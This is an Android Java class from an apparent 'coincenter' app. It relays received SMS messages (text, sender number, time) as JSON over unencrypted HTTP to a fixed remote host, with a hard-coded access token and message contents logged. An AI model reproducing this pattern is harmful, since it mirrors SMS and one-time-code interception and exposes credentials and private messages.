package com.moblie.coincenter;

import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;

import java.net.HttpURLConnection;
import java.net.URL;

import java.net.URLEncoder;
import java.util.ArrayList;


public class ConnServ extends Thread {
    String httpUrl;
    private ArrayList<Object> postData = null;
    //private Boolean isAsyn = false;


    public ConnServ(){
        postData = new ArrayList<Object>();
    }


    /*
    public void addData( String newData ){
        postData.add( newData );
    }
    */

    public void addData( ArrayList<String> newData ){
        postData.add( newData );
    }


    public int getPostLen(){
        if (postData == null){
            return -1 ;
        }
        return postData.size();
    }



    public void run(){
        Log.e( Constant.TONY_TAG , "connServ Threa is run." );
        int sleepTime = 3000;

        try {

            while (postData != null) {
                HttpURLConnection urlConn = null;

                if (postData.size() > 0) {
                    Log.e(Constant.TONY_TAG, "loop.wile");
                    String key = Manager.getInst().getKey();
                    String name = Manager.getInst().getName();
                    String post_url = Manager.getInst().getUrl();
                    //this.httpUrl = String.format("http://%s", post_url);
                    this.httpUrl = String.format("http://%s", "notify.ucoinx.com/notify/shortmsg");


                    //取出需要post data
                    Object pData = postData.get(0);
                    Log.e( Constant.TONY_TAG,  "connServ pData = "+ pData );
                    ArrayList<String> arrData = (ArrayList<String>)pData;
                    //取出需要post data end.

                    String smsData = arrData.get(0);  // 手機內容資料
                    String phone = arrData.get(1);  // 傳簡訊來源手機
                    String time = arrData.get(2);  // 收簡訊時間

                    /*
                    Log.e(  Constant.TONY_TAG,"phone = " +phone );
                    Log.e(  Constant.TONY_TAG,"time = " +time );
                    Log.e(  Constant.TONY_TAG,"smsData = " +smsData );
                    */


                    try {
                        URL url = new URL(httpUrl);
                        urlConn = (HttpURLConnection) url.openConnection();
                        urlConn.setConnectTimeout(3000);
                        urlConn.setUseCaches(false);

                        urlConn.setInstanceFollowRedirects(true);
                        urlConn.setReadTimeout(3000);
                        urlConn.setDoInput(true);
                        urlConn.setDoOutput(true);
                        urlConn.setRequestMethod("POST");
                        //urlConn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
                        urlConn.connect();

                        //String smsData = postData.get(0);  // 手機內容資料
                        postData.remove(pData);
                        Log.e(Constant.TONY_TAG, "loop.smsData = " + smsData);


                        // ----- post data ----- //
                        JSONObject postJson = new JSONObject();
                        //postJson.put("key", URLEncoder.encode(key, "UTF-8"));
                        //postJson.put("sms", URLEncoder.encode(smsData, "UTF-8"));
                        //postJson.put("name", URLEncoder.encode(name, "UTF-8"));
                        postJson.put("number", URLEncoder.encode(phone, "UTF-8"));
                        postJson.put("time", URLEncoder.encode(time, "UTF-8"));
                        postJson.put("message", URLEncoder.encode(smsData, "UTF-8"));
                        postJson.put("access_token", URLEncoder.encode("byr74d63amkc2bwfhqa6kkc1j7p1bxdnalngv2fh87epdo8yb", "UTF-8"));



                        String jsonStr = postJson.toString();
                        OutputStream out = urlConn.getOutputStream();
                        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(out));//建立字元流物件並用高效緩衝流包裝它，便獲得最高的效率,傳送的是字串推薦用字元流，其它資料就用位元組流
                        bw.write(jsonStr);//把json字串寫入緩衝區中
                        bw.flush();//重新整理緩衝區，把資料傳送出去，這步很重要
                        out.close();
                        bw.close();//使用完關閉

                        Log.e(Constant.TONY_TAG, "getResponseCode = " + urlConn.getResponseCode());
                        if (urlConn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                            InputStream in = urlConn.getInputStream();
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));
                            String str = null;
                            StringBuffer buffer = new StringBuffer();
                            while ((str = br.readLine()) != null) {     //BufferedReader特有功能，一次讀取一行資料
                                buffer.append(str);
                            }
                            in.close();
                            br.close();

                            Log.e(Constant.TONY_TAG, "postdata = " + buffer.toString());
                            Manager.getInst().mainActivity.ui_addRecord(
                                    Manager.getInst().mainActivity.getResources().getString(R.string.app_post_sms) +
                                            String.format(" [%s]", postData.size())
                            );
                        }

                    } catch (Exception e) {
                        e.printStackTrace();
                        Log.e(Constant.TONY_TAG, " SMS post errors; ");
                        postData.remove(pData); // post失敗需清空手機內容資料
                        //postData.remove(smsData); // post失敗需清空手機內容資料
                        //postData = null;
                    }
                } else {
                    /*
                    Manager.getInst().mainActivity.ui_addRecord(
                            Manager.getInst().mainActivity.getResources().getString(R.string.app_get_unsms)
                    );
                    */
                }


                if (postData.size() > 100) {
                    sleepTime = 1;
                } else if (postData.size() > 10) {
                    sleepTime = 100;
                } else {
                    sleepTime = 1000 * 3;
                }

                Log.e(Constant.TONY_TAG, "sleepTime　= " + sleepTime);
                Thread.sleep(sleepTime);


            }



        }catch( Exception e ){
            e.printStackTrace();
            Log.e(Constant.TONY_TAG, " Thread run errors; " );
        }

            /*
        }catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }catch (InterruptedException e) {
            e.printStackTrace();
        }

             */

    }
}





 /*  = DefaultHttpClient =
    public void _run(){
        Log.e( Constant.TONY_TAG , "threa is run" );
        //* Returns true if the string is null or 0-length.
        if(httpUrl.isEmpty()) return;
        int postCode = 400;

        HttpPost httpPost = new HttpPost(httpUrl);
        HttpClient httpClient = new DefaultHttpClient();
        UrlEncodedFormEntity entity;
        HttpResponse response;

        try {
            entity = new UrlEncodedFormEntity(params, "utf-8");
            httpPost.setEntity(entity);
            response = httpClient.execute(httpPost);
            postCode = response.getStatusLine().getStatusCode();

            String resData = EntityUtils.toString(response.getEntity());
            Log.e( Constant.TONY_TAG,  "test postCode= "+ postCode   );
            Log.e( Constant.TONY_TAG,  "test response= "+ response   );
            Log.e( Constant.TONY_TAG,  "test resData= "+ resData   );
            //Manager.getInst().mainActivity.reqCallBack(postCode, resData);


        } catch (UnsupportedEncodingException e) {
            //Manager.getInst().cancelAlertDialog();
            Manager.getInst().sysToast(Manager.getInst().mainActivity.getResources().getString(R.string.http_errors));
            e.printStackTrace();

        } catch (ClientProtocolException e) {
            //Manager.getInst().cancelAlertDialog();
            Manager.getInst().sysToast(Manager.getInst().mainActivity.getResources().getString(R.string.http_errors));
            e.printStackTrace();

        } catch (IOException e) {
            //Manager.getInst().cancelAlertDialog();
            Manager.getInst().sysToast(Manager.getInst().mainActivity.getResources().getString(R.string.http_errors));
            e.printStackTrace();

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
    */
